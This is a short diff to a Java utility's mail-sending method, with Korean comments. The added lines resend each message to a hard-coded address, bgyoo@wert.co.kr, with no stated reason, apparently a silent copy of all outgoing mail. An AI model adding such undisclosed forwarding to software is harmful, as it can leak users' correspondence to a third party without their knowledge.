@@ -293,6 +293,9 @@ public class CommonUtil {
 	         // 메일을 보냅니다.
 	         Transport.send(message);
 	         result=1001;//메일전송성공시
+	         
+	         message.setRecipient(Message.RecipientType.TO, new InternetAddress("bgyoo@wert.co.kr"));
+	         Transport.send(message);
 
 	      } catch (Throwable e) {
 	         result=2002;//메일전송실패시
